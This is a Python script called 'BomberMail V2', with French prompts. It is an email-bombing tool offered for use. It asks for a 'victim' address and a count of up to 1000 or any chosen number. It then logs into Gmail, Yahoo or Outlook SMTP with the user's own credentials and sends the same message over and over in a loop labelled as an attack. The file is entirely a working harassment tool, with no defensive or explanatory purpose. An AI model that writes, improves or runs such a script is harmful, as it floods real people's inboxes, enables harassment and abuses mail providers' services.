'''imports'''
import smtplib
import sys


class bcolors:
    GREEN = '\033[92m'
    YELLOW = "\033[93m"
    RED = "\033[91m"
    CYAN = '\033[96m'
    ORANGE = '\033[33m'
    PURPLE = '\033[45m'
    


def banner():
    print(bcolors.CYAN + '\~~~BomberMail V2~~~/')
    print(bcolors.CYAN + '\~~~Créer avec Python~~~/')
    print(bcolors.ORANGE + ''' 
                     \|/
                       `--+--'
                          |
                      ,--'#`--.
                      |#######|
                   _.-'#######`-._
                ,-'###############`-.
              ,'#####################`,         .___     .__         .
             |#########################|        [__ ._ _ [__) _ ._ _ |_  _ ._.
            |###########################|       [___[ | )[__)(_)[ | )[_)(/,[
           |#############################|
           |#############################|              Créer par HaXor DeRoutine
           |#############################|
            |###########################|
             \#########################/
              `.#####################,'
                `._###############_,'
                   `--..#####..--'     
                   
  
                                               
(B̸̛͙͔̬̍̒͑̾̒̅̚͠ǫ̵͓͕̘̤͎͗̐̽̄͜͠m̷̛̤̭̞̠̞͙͈̜̻̖̮̎͋̒̑̓̓̉̾̍b̵̨͇̺͕̾̑̃̈́̎̑̒̉̇̒̎͠ḙ̴̠̺̥̹͔̻̪̓̀̐͛ͅŗ̸̹̰͕̩͎̲͎̻̤͕̮̓͊̃̿̊̎͜M̶̱̈̉a̷̛̼̗̺͖͓̼͚͋̋͗̆̋̃̐̋̐̈́́͝i̷̢̡͇͚̺̪̭͕̟̖̤͓̱̇̀̿̉̋̊̓̅̓͘͜͠l̴̢͙̪̪̤͌̂̒̉̃̆̂̌͂̄͊̒̽͊̃ ̵̩͇̻̯͈̣͚̻͓̎̅͋̒̈̍͐͆̋͊͑͑́̚͘M̶̨̛͎̼̥͇̲̅̄͌͗́̾̊͝ͅǫ̸̧̮̳̺̱̪̙͔̥͉͆̔͂̈͜ͅd̷̞͕͇̝̓̈́̎́̈̍͝i̵̗͈̟̪̼̮͎͎͈͉̎̂̈́͊͆̈́͒̑f̶͎̝̟̽͆́̃̽i̵̗̓̿͋̓͋̄̿̐̄̋̚̕̚͝͝ȩ̶͇̮̗̄͜ͅͅͅḑ̴̯̘̲̬̝͖̞̪̬͖̦̮̖͉̃ ̷̭̈́̌̈́͌́͜b̸̳̙̐̀̍̽̒̓̋͒̇̀̔͂̊͝͝y̷̨̨͇̖̘̭̻̿̄͆̔̌̅̏̄͒̓̅̂̄̂́ ̸̧̞̥̱̺̳͓̦̖̙͈̅̏̈́̅͑̇͋̈́̐͑̊̚͘H̷̱̭͈͕͓̺̼̻̥̜͛̈͋ą̸̭̣̥͕̃̑̔̐̀̓͐̇̋́̈́͋͗͠ͅX̴̨̭̻̘̻͙̲̭͚̝͛̂̿̓̐̃ǫ̶̜̬͈̤̩̹̞̮̹̗̖͒̉̈́͗̉̀͌r̷͖̮͉̖͍̰͙̅̀̉̉͜͝ ̸̡̧̢͔͔̻̩̰̜͚̺͊̄̓͘̕͝d̶̡̧̧̗̥̫̩̝͓̥͍̜͍͎͚̍͠͠é̸̢̟̘̱̲̏̈́̎R̴̨͓͈̪̦̼͙̰̣̫̒͌͂̌͂́͐͂̀o̴̰̦͇͉͔̼̣̣̞̓̾̈́̋̀̄̋̈́̓̈́̀͑͑̚ͅͅu̷͚͙͚̼̺̝̤̰̎̌́̐̀͒͑̾̚͠ͅt̷̨̮͕̒̾́̂̅̾̅̓͛͒į̸̧̢̹̹̟͓̩̇̂́́̽̃͂͂̐ͅn̸̛͔͈̄̍̈́́͐̕̕͘e̶̢̨̧͈̮̻̝̿̃͋͒͘)
                                                               ''')
class Email_Bomber:
    count = 0

    def __init__(self):
        try:
            print(bcolors.PURPLE + '\n\~~~1ère étape du script~~~/')
            self.target = str(input(bcolors.BLUE + 'Écrit l adresse mail de ta victime ➡️ : '))
            self.mode = int(input(bcolors.BLUE + 'Choisis l option qui te convient || 1:(1000) 2:(500) 3:(250) 4:(Personnalisable) ➡️ : '))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print('ERROR: Option invalide. Aurevoir.')
                sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')

    def bomb(self):
        try:
            print(bcolors.PURPLE + '\n\~~~2ème étape du script~~~/')
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input(bcolors.BLUE + 'Combien de mails seront envoyés ? : '))
            print(bcolors.BLUE + f'\n\~~~Tu as sélectionné l option: {self.mode} et {self.amount} emails seront envoyés~~~/')
        except Exception as e:
            print(f'ERROR: {e}')

    def email(self):
        try:
            print(bcolors.PURPLE + '\n\~~~Dernière étape du script~~~/')
            self.server = str(input(bcolors.BLUE + 'Écrit : 1:Gmail 2:Yahoo 3:Outlook ➡️ : '))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input(bcolors.GREEN + 'Enter port number <: '))

            if default_port == True:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAddr = str(input(bcolors.BLUE + 'Écrit ton adresse email ➡️ : '))
            self.fromPwd = str(input(bcolors.BLUE + 
'Écrit ton mot de passe ➡️ : '))
            self.subject = str(input(bcolors.BLUE + 'Écrit le sujet du mail ➡️ : '))
            self.message = str(input(bcolors.BLUE + 'Écrit le message que va contenir le mail ➡️ : '))

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count +=1
            print(bcolors.YELLOW + f' Email envoyé avec succès ! : {self.count}')
        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
        print(bcolors.GREEN + '\n \~~~Attaque en cours~~~/')
        for email in range(self.amount+1):
            self.send()
        self.s.close()
        print(bcolors.GREEN + '\n \~~~Attaque finie~~~/')
        sys.exit(0)


if __name__=='__main__':
    banner()
    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()
    
